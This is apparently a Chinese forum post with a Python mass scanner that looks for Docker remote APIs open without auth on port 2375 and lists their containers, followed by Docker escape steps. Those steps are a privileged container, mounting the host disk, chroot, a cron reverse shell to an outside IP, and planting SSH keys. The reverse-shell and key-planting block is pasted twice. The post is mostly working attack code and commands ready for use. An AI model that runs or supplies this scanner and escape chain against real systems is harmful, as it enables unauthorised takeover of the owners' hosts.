
# python3
# by 5wimming

```python
import queue
import threading
import time
import requests
import json
import docker

thread_lock = threading.Lock()
out_result = [] # 输出列表
multi = 700 # 线程数量
queueSize = 800 # 申请队列空间大小,值一般略大于multi的值
input_file_path = "./port=2375.txt" # 输入文件路径，每个ip一行
output_file_path = './result.txt' #输出文件路径
ports = ['2375'] # 扫描端口
wait_time = 5 # 文件线程准备时间(s)，默认1s，若需要读取的文件大小大于10M可增加至5s以上，文件越大设置的时间理论上越长

def read_file():
    with open(input_file_path,'r') as fp:
        file_data = fp.readlines()
        data_list = file_data
        data_length = len(data_list)
        flag_xy = 0
        while flag_xy != data_length:
            while (not workQueue.full()) and (flag_xy != data_length):
                workQueue.put(data_list[flag_xy])
                flag_xy += 1
                continue
            print("文件内容放入队列完成")

def multi_start_main():
    while not workQueue.empty():
        file_line_api = workQueue.get()
        custom_def(file_line_api)

def http_get(url):
    response = requests.get(url)
    return response.text

def get_version(host, port):
    url = "http://"+host+":"+port+"/version"
    ret = json.loads(http_get(url))
    client_api_version = ret['ApiVersion']
    return client_api_version

def get_container(host, port, docker_version):
    cli = Client(base_url='tcp://'+host+':'+port, version=docker_version)
    return cli

def custom_def(file_line_api):
    ip = file_line_api.strip()
    result = ''
    for port in ports:
        try:
            docker_version = get_version(ip, port)
            result = ip + '\t' + port + '\tversion:' + docker_version
            docker_containers = get_container(ip, port, docker_version)
            result += '\t' + str(docker_containers.containers(all=True))
        except Exception as e:
            print(ip, e)
        if result:
            print('success:', result)
            with thread_lock:
                out_result.append(result)
            break

if __name__ == '__main__':
    threads = []
    workQueue = queue.Queue(queueSize)
    fileThread = threading.Thread(target=read_file)
    fileThread.start()
    print("文件读取线程准备时间%ss" % wait_time)
    time.sleep(wait_time)
    for i in range(multi+1):
        thread = threading.Thread(target=multi_start_main)
        thread.start()
        threads.append(thread)
    for t in threads:
        t.join()
    fileThread.join()
    with open(output_file_path,'w') as fw:
        fw.writelines(out_result)
    print("主线程结束，任务完成")
```

## docker远程连接列出镜像目录

可以发现2375端口开启，并且是不需要授权访问的

![](https://bbs.kanxue.com/upload/attach/202203/921599_TB5A3NY47WDH4ZK.jpg)

## docker逃逸

前提：靶机服务器需要能执行`docker run`指令

```bash
sudo docker run -itd --privileged=true ubuntu:latest /bin/bash
```

### 逃逸指令

```bash
新建一个目录：mkdir /test
挂载磁盘到新建目录：mount /dev/vda1 /test
切换根目录：chroot /test
```

至此已经可以控制宿主机了，但是关于反弹shell以及写入自己的ssh密钥这个不一定可以直接操作，由于风险原因我不会进行反弹shell和ssh密钥写入，方法如下

```bash
写计划任务，反弹宿主机Shell。
echo '* * * * * /bin/bash -i >& /dev/tcp/39.106.51.35/1234 0>&1' >> /test/var/spool/cron/crontabs/root

如果要写SSH的话，需要挂载宿主机的root目录到容器。
docker run -itd -v /root:/root ubuntu:18.04 /bin/bash
mkdir /root/.ssh
cat id_rsa.pub >> /root/.ssh/authorized_keys
然后ssh 私钥登录。写计划任务，反弹宿主机Shell。
echo '* * * * * /bin/bash -i >& /dev/tcp/39.106.51.35/1234 0>&1' >> /test/var/spool/cron/crontabs/root

如果要写SSH的话，需要挂载宿主机的root目录到容器。
docker run -itd -v /root:/root ubuntu:18.04 /bin/bash
mkdir /root/.ssh
cat id_rsa.pub >> /root/.ssh/authorized_keys
然后ssh 私钥登录。
```

# 额外逃逸思路

如果上面的逃逸办法用不了，服务器上有用docker挂载web服务可以尝试进入容器上webshell变相拿下

[冰与火的战歌：Windows内核攻防实战高级班！从零到实战，融合AI与Windows内核攻防全技术栈，打造具备自动化能力的内核开发高手。](https://www.kanxue.com/book-section_list-227.htm)

最后于 2022-3-27 18:53

被H.R.P编辑，原因：
